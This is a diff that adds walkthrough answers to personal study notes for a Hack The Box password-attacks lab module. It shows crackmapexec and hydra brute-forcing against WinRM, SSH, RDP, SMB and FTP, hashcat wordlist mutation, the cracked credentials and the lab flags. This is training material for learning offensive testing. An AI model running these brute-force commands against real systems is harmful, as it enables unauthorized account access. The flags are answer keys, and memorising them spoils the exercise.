@@ -2241,11 +2241,99 @@ Results: cf3a5525ee9414229e66279623ed5c58
 
 ## [Password Attacks](https://academy.hackthebox.com/module/details/147)
 
-### Introduction
-
-
 ### Remote Password Attacks
 
+ **Find the user for the WinRM service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.**
+ 
+```bash
+crackmapexec winrm $ip -u username.list -p password.list    
+# Results: WINRM       10.129.173.81   5985   WINSRV           [+] WINSRV\john:november (Pwn3d!)
+
+evil-winrm -i $ip -u john -p 'november' 
+type "C:\Users\john\Desktop\flag.txt"
+```
+
+Results: HTB{That5Novemb3r}
+
+
+
+ **Find the user for the SSH service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.**
+ 
+```bash
+hydra -L username.list -P password.list ssh://$ip
+# Results: [22][ssh] host: 10.129.173.81   login: dennis   password: rockstar
+
+ssh dennis@$ip
+type C:\Users\dennis\Desktop\flag.txt
+```
+
+Results: HTB{Let5R0ck1t}
+
+
+Find the user for the RDP service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
+  
+```bash
+hydra -L ~/borrar/username.list -P ~/borrar/password.list rdp://$ip 
+# Result: [3389][rdp] host: 10.129.173.81   login: chris   password: 789456123
+
+xfreerdp /u:chris  /p:789456123 /v:$ip /cert:ignore 
+# open the flag.txt in Desktop.
+
+```
+
+Results: HTB{R3m0t3DeskIsw4yT00easy}
+
+**Find the user for the SMB service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.**
+ 
+```bash
+crackmapexec smb $ip -u username.list -p password.list --continue-on-success
+# Results: SMB         10.129.173.81   445    WINSRV           [+] WINSRV\cassie:12345678910 
+
+smbclient  \\\\$ip\\CASSIE -U cassie
+get flag.txt
+quit
+cat flag.txt
+
+```
+
+Results: HTB{S4ndM4ndB33}  
+
+
+**Create a mutated wordlist using the files in the ZIP file under "Resources" in the top right corner of this section. Use this wordlist to brute force the password for the user "sam". Once successful, log in with SSH and submit the contents of the flag.txt file as your answer.**
+ 
+```bash
+# Download the zip file and unzip it:
+unzip Password-Attacks.zip
+
+# Create a mutated list 
+hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
+
+cat mut_password.list  | grep -E '^.{11,}$' > new_mutated.list
+
+
+# Evaluate open services:
+sudo nmap -sC -sV 10.129.182.237 -Pn
+# Results: 21 and 22
+
+# Let's bruteforce ftp:
+hydra -l sam -P new_mutated.list -t 64 ftp://10.129.182.237
+# Result: [21][ftp] host: 10.129.182.237   login: sam   password: B@tm@n2022!
+
+ssh sam$ip
+
+cat smb/flag.txt
+```
+
+Results: HTB{P455_Mu7ations}
+
+
+**Use the user's credentials we found in the previous section and find out the credentials for MySQL. Submit the credentials as the answer. (Format: `<username>:<password>)`:**
+
+```bash
+
+```
+
+Results:
 
 
 ### Windows Local Password Attacks
